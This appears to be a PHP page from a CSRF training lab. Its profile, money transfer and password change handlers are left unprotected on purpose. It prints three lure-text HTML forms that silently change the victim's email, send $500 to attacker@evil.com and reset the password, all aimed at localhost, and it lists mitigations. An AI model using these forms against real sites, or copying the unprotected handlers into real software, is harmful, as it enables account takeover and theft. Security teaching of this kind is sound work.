<?php
// Lab 1: Basic CSRF Attack
// Vulnerability: Missing CSRF protection on sensitive actions

session_start();

$message = '';
$user_profile = [];

// Initialize user profile if not exists
if (!isset($_SESSION['user_profile'])) {
    $_SESSION['user_profile'] = [
        'username' => 'victim_user',
        'email' => 'victim@example.com',
        'role' => 'user',
        'balance' => 1000.00,
        'phone' => '+1-555-0123',
        'address' => '123 Main St, City, State'
    ];
}

$user_profile = $_SESSION['user_profile'];

// Handle profile update (vulnerable to CSRF)
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['update_profile'])) {
    $username = $_POST['username'] ?? $user_profile['username'];
    $email = $_POST['email'] ?? $user_profile['email'];
    $phone = $_POST['phone'] ?? $user_profile['phone'];
    $address = $_POST['address'] ?? $user_profile['address'];
    
    // Update profile without CSRF protection
    $_SESSION['user_profile'] = [
        'username' => $username,
        'email' => $email,
        'role' => $user_profile['role'],
        'balance' => $user_profile['balance'],
        'phone' => $phone,
        'address' => $address
    ];
    
    $user_profile = $_SESSION['user_profile'];
    $message = '<div class="alert alert-success">Profile updated successfully!</div>';
}

// Handle balance transfer (vulnerable to CSRF)
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['transfer_money'])) {
    $amount = (float)($_POST['amount'] ?? 0);
    $recipient = $_POST['recipient'] ?? '';
    
    if ($amount > 0 && $amount <= $user_profile['balance']) {
        $_SESSION['user_profile']['balance'] -= $amount;
        $user_profile = $_SESSION['user_profile'];
        $message = '<div class="alert alert-success">Transfer successful! Sent $' . number_format($amount, 2) . ' to ' . htmlspecialchars($recipient) . '</div>';
    } else {
        $message = '<div class="alert alert-danger">Invalid transfer amount or insufficient funds!</div>';
    }
}

// Handle password change (vulnerable to CSRF)
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['change_password'])) {
    $new_password = $_POST['new_password'] ?? '';
    $confirm_password = $_POST['confirm_password'] ?? '';
    
    if ($new_password === $confirm_password && strlen($new_password) >= 6) {
        $message = '<div class="alert alert-success">Password changed successfully!</div>';
    } else {
        $message = '<div class="alert alert-danger">Password change failed! Passwords do not match or are too short.</div>';
    }
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Lab 1: Basic CSRF Attack - CSRF Labs</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.9.1/font/bootstrap-icons.css">
    
    <style>
        :root {
            --primary-dark: #1a1f36;
            --accent-green: #48bb78;
            --accent-blue: #4299e1;
            --accent-orange: #ed8936;
            --accent-red: #f56565;
        }
        
        body {
            background: linear-gradient(135deg, #0f172a 0%, #1e293b 100%);
            color: #e2e8f0;
            min-height: 100vh;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }

        .navbar-brand {
            font-weight: 700;
            font-size: 1.5rem;
            color: var(--accent-green) !important;
        }

        .nav-link {
            font-weight: 500;
            transition: color 0.3s;
        }

        .nav-link:hover {
            color: var(--accent-green) !important;
        }

        .hero-section {
            background: linear-gradient(rgba(15, 23, 42, 0.9), rgba(15, 23, 42, 0.9)), 
                        url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100" viewBox="0 0 100 100"><rect width="100" height="100" fill="%231e293b"/><path d="M0 0L100 100M100 0L0 100" stroke="%23374151" stroke-width="1"/></svg>');
            padding: 2rem 0;
            border-bottom: 1px solid #2d3748;
            margin-bottom: 2rem;
        }

        .hero-title {
            font-size: 2rem;
            font-weight: 700;
            background: linear-gradient(90deg, #48bb78, #4299e1);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            margin-bottom: 0.5rem;
        }

        .hero-subtitle {
            font-size: 1rem;
            color: #cbd5e0;
        }

        .section-title {
            margin-top: 30px;
            margin-bottom: 20px;
            font-weight: 700;
            font-size: 1.5rem;
            position: relative;
            padding-bottom: 10px;
        }

        .section-title::after {
            content: '';
            position: absolute;
            bottom: 0;
            left: 0;
            width: 60px;
            height: 4px;
            background: linear-gradient(90deg, var(--accent-green), var(--accent-blue));
            border-radius: 2px;
        }

        .card {
            background: rgba(30, 41, 59, 0.7);
            border-radius: 12px;
            border: 1px solid #334155;
            color: #e2e8f0;
        }

        .card-header {
            background: rgba(15, 23, 42, 0.5);
            border-bottom: 1px solid #334155;
            font-weight: 600;
            padding: 1rem 1.5rem;
        }

        .form-control, .form-select {
            background: rgba(30, 41, 59, 0.7);
            border: 1px solid #334155;
            color: #e2e8f0;
            padding: 0.75rem 1rem;
        }

        .form-control:focus, .form-select:focus {
            background: rgba(30, 41, 59, 0.9);
            border-color: var(--accent-green);
            box-shadow: 0 0 0 0.2rem rgba(72, 187, 120, 0.25);
            color: #e2e8f0;
        }

        .form-label {
            font-weight: 500;
            color: #cbd5e0;
        }

        .btn-primary {
            background: linear-gradient(90deg, var(--accent-green), var(--accent-blue));
            border: none;
            padding: 0.75rem 1.5rem;
            font-weight: 600;
            transition: all 0.3s;
        }

        .btn-primary:hover {
            transform: translateY(-2px);
            box-shadow: 0 4px 12px rgba(72, 187, 120, 0.3);
        }

        .vulnerability-info {
            background: rgba(30, 41, 59, 0.7);
            border-radius: 12px;
            border: 1px solid #334155;
            padding: 1.5rem;
            margin-bottom: 2rem;
            border-left: 4px solid var(--accent-orange);
        }

        .payload-examples {
            background: rgba(30, 41, 59, 0.7);
            border-radius: 12px;
            border: 1px solid #334155;
            padding: 1.5rem;
            margin-bottom: 2rem;
            border-left: 4px solid var(--accent-blue);
        }

        .danger-zone {
            background: rgba(30, 41, 59, 0.7);
            border-radius: 12px;
            border: 1px solid #334155;
            padding: 1.5rem;
            margin-bottom: 2rem;
            border-left: 4px solid var(--accent-red);
        }

        pre {
            background: rgba(15, 23, 42, 0.7);
            border-radius: 8px;
            padding: 1.5rem;
            color: #e2e8f0;
            border: 1px solid #334155;
            overflow-x: auto;
        }

        .lab-info {
            background: rgba(30, 41, 59, 0.7);
            border-radius: 12px;
            border: 1px solid #334155;
            padding: 1.5rem;
            margin-bottom: 2rem;
        }

        .lab-badge {
            background: linear-gradient(90deg, var(--accent-green), var(--accent-blue));
            color: #1a202c;
            font-weight: 600;
            padding: 0.5rem 1rem;
            border-radius: 6px;
            display: inline-block;
            margin-bottom: 1rem;
        }

        .profile-display {
            background: rgba(15, 23, 42, 0.7);
            border-radius: 8px;
            padding: 1.5rem;
            margin: 1rem 0;
            border-left: 4px solid var(--accent-green);
        }

        .test-urls {
            background: rgba(15, 23, 42, 0.7);
            border-radius: 8px;
            padding: 1rem;
            margin-bottom: 1rem;
            border-left: 4px solid var(--accent-blue);
        }

        .profile-info {
            background: rgba(15, 23, 42, 0.5);
            border-radius: 8px;
            padding: 1rem;
            margin: 0.5rem 0;
        }

        .sensitive-data {
            background: rgba(15, 23, 42, 0.5);
            border-radius: 8px;
            padding: 1rem;
            margin: 0.5rem 0;
            border-left: 4px solid var(--accent-red);
        }

        .code-block {
            background: rgba(15, 23, 42, 0.7);
            border-radius: 8px;
            padding: 1rem;
            margin: 0.5rem 0;
            border-left: 4px solid var(--accent-blue);
            font-family: 'Courier New', monospace;
            white-space: pre-wrap;
        }
    </style>
</head>
<body>
    <nav class="navbar navbar-expand-md navbar-dark sticky-top" style="background-color: var(--primary-dark);">
        <div class="container-fluid">
            <a class="navbar-brand" href="index.php">
                <i class="bi bi-arrow-left me-2"></i>Back to CSRF Labs
            </a>
            <button class="navbar-toggler" type="button" data-bs-toggle="collapse"
                data-bs-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false"
                aria-label="Toggle navigation">
                <span class="navbar-toggler-icon"></span>
            </button>

            <div class="collapse navbar-collapse" id="navbarSupportedContent">
                <ul class="navbar-nav me-auto mb-2 mb-lg-0">
                    <li class="nav-item">
                        <a class="nav-link active" href="../about">About</a>
                    </li>
                    <li class="nav-item">
                        <a class="nav-link active" href="../contact">Contact Us</a>
                    </li>
                </ul>
            </div>
        </div>
    </nav>

    <div class="hero-section">
        <div class="container">
            <h1 class="hero-title">Lab 1: Basic CSRF Attack</h1>
            <p class="hero-subtitle">Missing CSRF protection on sensitive actions</p>
        </div>
    </div>

    <div class="container mb-5">
        <div class="lab-info">
            <span class="lab-badge">Difficulty: Low</span>
            <h3 class="section-title">Lab Overview</h3>
            <p>This lab demonstrates a basic CSRF vulnerability where sensitive actions like profile updates, money transfers, and password changes lack proper CSRF protection. An attacker can trick a user into performing these actions without their knowledge.</p>
            <p><strong>Objective:</strong> Create malicious HTML forms or use other techniques to perform unauthorized actions on behalf of the victim user.</p>
        </div>

        <div class="row">
            <div class="col-lg-6">
                <div class="card mb-4">
                    <div class="card-header text-center">
                        <i class="bi bi-code-slash me-2"></i>Vulnerable Code
                    </div>
                    <div class="card-body">
                        <pre>
// Vulnerable: No CSRF protection
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['update_profile'])) {
    $username = $_POST['username'] ?? $user_profile['username'];
    $email = $_POST['email'] ?? $user_profile['email'];
    // Update profile without CSRF token validation
    $_SESSION['user_profile'] = [
        'username' => $username,
        'email' => $email,
        // ... other fields
    ];
}

// Vulnerable: Money transfer without CSRF protection
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['transfer_money'])) {
    $amount = (float)($_POST['amount'] ?? 0);
    $recipient = $_POST['recipient'] ?? '';
    // Process transfer without CSRF validation
    $_SESSION['user_profile']['balance'] -= $amount;
}</pre>
                    </div>
                </div>
            </div>
            
            <div class="col-lg-6">
                <div class="card">
                    <div class="card-header">
                        <i class="bi bi-person me-2"></i>User Profile
                    </div>
                    <div class="card-body">
                        <?php echo $message; ?>
                        
                        <div class="profile-info">
                            <h5>Current Profile</h5>
                            <p><strong>Username:</strong> <?php echo htmlspecialchars($user_profile['username']); ?></p>
                            <p><strong>Email:</strong> <?php echo htmlspecialchars($user_profile['email']); ?></p>
                            <p><strong>Role:</strong> <?php echo htmlspecialchars($user_profile['role']); ?></p>
                            <p><strong>Balance:</strong> $<?php echo number_format($user_profile['balance'], 2); ?></p>
                            <p><strong>Phone:</strong> <?php echo htmlspecialchars($user_profile['phone']); ?></p>
                            <p><strong>Address:</strong> <?php echo htmlspecialchars($user_profile['address']); ?></p>
                        </div>
                    </div>
                </div>
            </div>
        </div>

        <div class="row mt-4">
            <div class="col-md-6">
                <div class="card">
                    <div class="card-header">
                        <i class="bi bi-person-gear me-2"></i>Profile Update
                    </div>
                    <div class="card-body">
                        <form method="POST">
                            <input type="hidden" name="update_profile" value="1">
                            <div class="mb-3">
                                <label for="username" class="form-label">Username</label>
                                <input type="text" class="form-control" id="username" name="username" 
                                       value="<?php echo htmlspecialchars($user_profile['username']); ?>">
                            </div>
                            <div class="mb-3">
                                <label for="email" class="form-label">Email</label>
                                <input type="email" class="form-control" id="email" name="email" 
                                       value="<?php echo htmlspecialchars($user_profile['email']); ?>">
                            </div>
                            <div class="mb-3">
                                <label for="phone" class="form-label">Phone</label>
                                <input type="text" class="form-control" id="phone" name="phone" 
                                       value="<?php echo htmlspecialchars($user_profile['phone']); ?>">
                            </div>
                            <div class="mb-3">
                                <label for="address" class="form-label">Address</label>
                                <textarea class="form-control" id="address" name="address" rows="2"><?php echo htmlspecialchars($user_profile['address']); ?></textarea>
                            </div>
                            <button type="submit" class="btn btn-primary">Update Profile</button>
                        </form>
                    </div>
                </div>
            </div>
            
            <div class="col-md-6">
                <div class="card">
                    <div class="card-header">
                        <i class="bi bi-arrow-left-right me-2"></i>Money Transfer
                    </div>
                    <div class="card-body">
                        <form method="POST">
                            <input type="hidden" name="transfer_money" value="1">
                            <div class="mb-3">
                                <label for="amount" class="form-label">Amount</label>
                                <input type="number" class="form-control" id="amount" name="amount" 
                                       step="0.01" min="0" max="<?php echo $user_profile['balance']; ?>">
                            </div>
                            <div class="mb-3">
                                <label for="recipient" class="form-label">Recipient</label>
                                <input type="text" class="form-control" id="recipient" name="recipient" 
                                       placeholder="Enter recipient email or username">
                            </div>
                            <button type="submit" class="btn btn-primary">Transfer Money</button>
                        </form>
                    </div>
                </div>
            </div>
        </div>

        <div class="row mt-4">
            <div class="col-12">
                <div class="card">
                    <div class="card-header">
                        <i class="bi bi-shield-lock me-2"></i>Password Change
                    </div>
                    <div class="card-body">
                        <form method="POST">
                            <input type="hidden" name="change_password" value="1">
                            <div class="row">
                                <div class="col-md-6 mb-3">
                                    <label for="new_password" class="form-label">New Password</label>
                                    <input type="password" class="form-control" id="new_password" name="new_password">
                                </div>
                                <div class="col-md-6 mb-3">
                                    <label for="confirm_password" class="form-label">Confirm Password</label>
                                    <input type="password" class="form-control" id="confirm_password" name="confirm_password">
                                </div>
                            </div>
                            <button type="submit" class="btn btn-primary">Change Password</button>
                        </form>
                    </div>
                </div>
            </div>
        </div>

        <div class="row mt-4">
            <div class="col-md-6">
                <div class="vulnerability-info">
                    <h5><i class="bi bi-bug me-2"></i>Vulnerability Details</h5>
                    <ul>
                        <li><strong>Type:</strong> Cross-Site Request Forgery (CSRF)</li>
                        <li><strong>Severity:</strong> High</li>
                        <li><strong>Method:</strong> POST</li>
                        <li><strong>Issue:</strong> Missing CSRF protection on sensitive actions</li>
                    </ul>
                </div>
            </div>
            
            <div class="col-md-6">
                <div class="payload-examples">
                    <h5><i class="bi bi-target me-2"></i>CSRF Attack Examples</h5>
                    <p>Create these malicious HTML files to test CSRF:</p>
                    <ul>
                        <li><code>profile_csrf.html</code> - Profile update attack</li>
                        <li><code>transfer_csrf.html</code> - Money transfer attack</li>
                        <li><code>password_csrf.html</code> - Password change attack</li>
                    </ul>
                </div>
            </div>
        </div>

        <div class="test-urls">
            <h5><i class="bi bi-link me-2"></i>CSRF Attack Payloads</h5>
            <p>Create these malicious HTML files to test CSRF attacks:</p>
            
            <h6>1. Profile Update CSRF (profile_csrf.html):</h6>
            <div class="code-block">&lt;html&gt;
&lt;body&gt;
    &lt;h1&gt;You won a prize! Click here to claim it!&lt;/h1&gt;
    &lt;form action="http://localhost/test/csrf/1.php" method="POST"&gt;
        &lt;input type="hidden" name="update_profile" value="1"&gt;
        &lt;input type="hidden" name="username" value="hacked_user"&gt;
        &lt;input type="hidden" name="email" value="hacker@evil.com"&gt;
        &lt;input type="hidden" name="phone" value="+1-555-9999"&gt;
        &lt;input type="hidden" name="address" value="Evil Street, Hacker City"&gt;
        &lt;input type="submit" value="Claim Prize"&gt;
    &lt;/form&gt;
&lt;/body&gt;
&lt;/html&gt;</div>

            <h6>2. Money Transfer CSRF (transfer_csrf.html):</h6>
            <div class="code-block">&lt;html&gt;
&lt;body&gt;
    &lt;h1&gt;Special offer! Get $100 bonus!&lt;/h1&gt;
    &lt;form action="http://localhost/test/csrf/1.php" method="POST"&gt;
        &lt;input type="hidden" name="transfer_money" value="1"&gt;
        &lt;input type="hidden" name="amount" value="500"&gt;
        &lt;input type="hidden" name="recipient" value="attacker@evil.com"&gt;
        &lt;input type="submit" value="Get Bonus"&gt;
    &lt;/form&gt;
&lt;/body&gt;
&lt;/html&gt;</div>

            <h6>3. Password Change CSRF (password_csrf.html):</h6>
            <div class="code-block">&lt;html&gt;
&lt;body&gt;
    &lt;h1&gt;Security update required!&lt;/h1&gt;
    &lt;form action="http://localhost/test/csrf/1.php" method="POST"&gt;
        &lt;input type="hidden" name="change_password" value="1"&gt;
        &lt;input type="hidden" name="new_password" value="hacked123"&gt;
        &lt;input type="hidden" name="confirm_password" value="hacked123"&gt;
        &lt;input type="submit" value="Update Security"&gt;
    &lt;/form&gt;
&lt;/body&gt;
&lt;/html&gt;</div>
        </div>

        <div class="danger-zone">
            <h5><i class="bi bi-exclamation-triangle me-2"></i>Real-World Attack Scenarios</h5>
            <ul>
                <li>Unauthorized profile modifications and personal information changes</li>
                <li>Unauthorized financial transactions and money transfers</li>
                <li>Password changes and account takeovers</li>
                <li>Privilege escalation and administrative access</li>
                <li>Data exfiltration and unauthorized data access</li>
                <li>Compliance violations and security breaches</li>
            </ul>
        </div>

        <div class="card mt-4">
            <div class="card-header">
                <i class="bi bi-lightbulb me-2"></i>Mitigation Strategies
            </div>
            <div class="card-body">
                <ul>
                    <li>Implement CSRF tokens for all state-changing operations</li>
                    <li>Use SameSite cookie attributes to prevent cross-site requests</li>
                    <li>Implement proper request validation and authorization checks</li>
                    <li>Use double-submit cookie pattern for additional protection</li>
                    <li>Implement proper session management and timeout</li>
                    <li>Regular security testing and vulnerability assessments</li>
                    <li>Monitor for unusual request patterns and anomalies</li>
                </ul>
            </div>
        </div>
    </div>

    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.0/dist/js/bootstrap.bundle.min.js"></script>
</body>
</html>
